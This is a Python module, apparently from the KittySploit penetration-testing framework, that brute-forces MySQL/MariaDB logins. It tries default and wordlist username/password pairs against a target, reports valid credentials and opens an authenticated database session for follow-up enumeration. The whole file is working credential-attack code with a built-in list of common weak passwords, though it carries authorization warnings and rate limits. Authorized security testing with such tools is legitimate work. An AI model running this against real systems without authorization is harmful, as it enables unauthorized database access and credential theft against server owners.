#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MySQL login bruteforce — tests username/password combinations against a MySQL/MariaDB server.
"""

from __future__ import annotations

import itertools
import os
import time
from typing import Any, List, Optional, Tuple

import pymysql

from kittysploit import *
from core.framework.base_module import ModuleResult
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.scanner.mysql.detectors import fingerprint_mysql


DEFAULT_MYSQL_USERS = ["root", "admin", "mysql", "test", "user"]
DEFAULT_MYSQL_PASSWORDS = ["", "root", "password", "mysql", "admin", "123456", "toor", "admin123"]


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "MySQL login bruteforce",
        "description": (
            "Attempts common and wordlist-based MySQL/MariaDB credentials. "
            "Use only on authorized targets — rate-limited by default."
        ),
        "author": "KittySploit Team",
        "tags": ["mysql", "mariadb", "database", "credentials", "bruteforce", "scanner"],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_spray", "network_probe"],
            "expected_requests": 20,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "chain": {
                "consumes_capabilities": [],
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "username"},
                    "authenticated_session",
                ],
                "option_bindings": {},
                "suggested_followups": [
                    "post/mysql/gather/enum_users",
                    "post/mysql/gather/enum_databases",
                    "post/mysql/gather/check_mysql_hardening",
                ],
            },
        },
    }

    port = OptPort(3306, "MySQL port", True)
    database = OptString("", "Default database for login attempts (optional)", False)
    username = OptString("", "Single username to try", False)
    password = OptString("", "Single password to try", False)
    usernames_file = OptFile("", "File with usernames (one per line)", False)
    passwords_file = OptFile("", "File with passwords (one per line)", False)
    delay = OptFloat(0.25, "Delay between attempts in seconds", False)
    max_attempts = OptInteger(50, "Maximum credential pairs to try (0 = unlimited)", False)
    stop_on_success = OptBool(True, "Stop after the first valid credential pair", False)
    create_session = OptBool(True, "Register a MySQL session on successful login", False)

    def _opt(self, name: str, default: Any = "") -> Any:
        value = getattr(self, name, default)
        if hasattr(value, "value"):
            return value.value
        return value

    def _read_wordlist(self, path: str) -> List[str]:
        if not path or not os.path.isfile(path):
            if path:
                print_warning(f"Wordlist not found: {path}")
            return []
        values: List[str] = []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    item = line.strip()
                    if item and not item.startswith("#"):
                        values.append(item)
        except OSError as exc:
            print_warning(f"Unable to read wordlist {path}: {exc}")
        return values

    def _build_candidates(self) -> List[Tuple[str, str]]:
        users: List[str] = []
        passwords: List[str] = []

        single_user = str(self._opt("username", "") or "").strip()
        single_pass = str(self._opt("password", "") or "")
        users_file = str(self._opt("usernames_file", "") or "").strip()
        passes_file = str(self._opt("passwords_file", "") or "").strip()

        if single_user:
            users = [single_user]
        else:
            users.extend(self._read_wordlist(users_file))
            if not users:
                users = list(DEFAULT_MYSQL_USERS)
                print_warning("No username source provided, using built-in defaults.")

        if single_user and single_pass:
            passwords = [single_pass]
        elif single_user and not passes_file:
            passwords = list(DEFAULT_MYSQL_PASSWORDS)
        else:
            if single_pass:
                passwords.append(single_pass)
            passwords.extend(self._read_wordlist(passes_file))
            if not passwords:
                passwords = list(DEFAULT_MYSQL_PASSWORDS)
                print_warning("No password source provided, using built-in defaults.")

        users = list(dict.fromkeys(users))
        passwords = list(dict.fromkeys(passwords))
        pairs = list(itertools.product(users, passwords))
        limit = int(self._opt("max_attempts", 50) or 0)
        if limit > 0:
            pairs = pairs[:limit]
        return pairs

    def _connect(self, host: str, username: str, password: str) -> Optional[pymysql.connections.Connection]:
        db_name = str(self._opt("database", "") or "").strip() or None
        timeout = max(int(float(self._timeout())), 3)
        try:
            connection = pymysql.connect(
                host=host,
                port=self._port(),
                user=username,
                password=password,
                database=db_name,
                connect_timeout=timeout,
                read_timeout=timeout,
                write_timeout=timeout,
            )
            connection.ping(reconnect=False)
            return connection
        except pymysql.err.OperationalError as exc:
            code = exc.args[0] if exc.args else 0
            if code == 1045:
                return None
            if code == 1049 and db_name:
                # Auth succeeded but the requested database does not exist.
                try:
                    connection = pymysql.connect(
                        host=host,
                        port=self._port(),
                        user=username,
                        password=password,
                        connect_timeout=timeout,
                        read_timeout=timeout,
                        write_timeout=timeout,
                    )
                    connection.ping(reconnect=False)
                    return connection
                except pymysql.err.OperationalError:
                    return None
            print_debug(f"MySQL connect error ({code}): {exc}")
            return None
        except pymysql.Error as exc:
            print_debug(f"MySQL error for {username}: {exc}")
            return None

    def _register_session(
        self,
        host: str,
        connection: pymysql.connections.Connection,
        username: str,
        password: str,
    ) -> Optional[str]:
        if not bool(self._opt("create_session", True)):
            connection.close()
            return None
        if not self.framework or not hasattr(self.framework, "session_manager"):
            print_warning("Framework session manager unavailable — connection not registered")
            connection.close()
            return None

        db_name = str(self._opt("database", "") or "").strip()
        session_data = {
            "host": host,
            "port": self._port(),
            "username": username,
            "password": password,
            "database": db_name,
            "connection": connection,
            "platform": "mysql",
        }
        session_id = self.framework.session_manager.create_session(
            host=host,
            port=int(self._port()),
            session_type=SessionType.MYSQL.value,
            data=session_data,
        )
        print_success(f"MySQL session registered: {session_id}")
        print_info("Use `sessions -i <id>` to open the MySQL shell")
        return session_id

    def check(self):
        host = self._host()
        port = self._port()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not self.is_tcp_open(host=host, port=port):
            return {
                "vulnerable": False,
                "reason": f"TCP port {port} closed on {host}",
                "confidence": "high",
            }
        info = fingerprint_mysql(host=host, port=port, timeout=min(float(self._timeout()), 5.0))
        if info.get("success"):
            version = info.get("Version") or "unknown"
            return {
                "vulnerable": True,
                "reason": f"MySQL/MariaDB reachable ({version})",
                "confidence": "low",
            }
        return {
            "vulnerable": True,
            "reason": f"TCP port {port} open — service fingerprint inconclusive",
            "confidence": "low",
        }

    def run(self):
        host = self._host()
        if not host:
            print_warning("Target is required")
            return False

        if not self.is_tcp_open(host=host, port=self._port()):
            print_error(f"TCP port {self._port()} is not open on {host}")
            return False

        print_warning("Only run against authorized MySQL/MariaDB targets")
        candidates = self._build_candidates()
        delay = max(float(self._opt("delay", 0.25) or 0.0), 0.0)
        stop_on_success = bool(self._opt("stop_on_success", True))

        print_status(
            f"Trying up to {len(candidates)} credential pair(s) on "
            f"{host}:{self._port()} (delay={delay}s)..."
        )

        found: List[dict] = []
        for index, (user, pwd) in enumerate(candidates, start=1):
            label = f"{user}:{pwd if pwd else '(empty)'}"
            print_status(f"[{index}/{len(candidates)}] Trying {label}")

            connection = self._connect(host, user, pwd)
            if not connection:
                if delay > 0 and index < len(candidates):
                    time.sleep(delay)
                continue

            print_success(f"Valid MySQL credentials: {user}:{pwd if pwd else '(empty)'}")
            session_id = self._register_session(host, connection, user, pwd)
            entry = {
                "username": user,
                "password": pwd,
                "host": host,
                "port": self._port(),
                "session_id": session_id,
            }
            found.append(entry)

            self.vulnerability_info = {
                "reason": f"MySQL login succeeded for {user}",
                "severity": "High",
                "username": user,
                "password": pwd,
                "host": host,
                "port": self._port(),
            }
            if session_id:
                self.vulnerability_info["session_id"] = session_id

            if stop_on_success:
                if session_id:
                    return ModuleResult(success=True, session_id=session_id, data=entry)
                return True

            if delay > 0:
                time.sleep(delay)

        if found:
            last = found[-1]
            print_success(f"Found {len(found)} valid credential pair(s)")
            if last.get("session_id"):
                return ModuleResult(success=True, session_id=last["session_id"], data=last)
            return True

        print_info("No valid MySQL credentials matched")
        return False
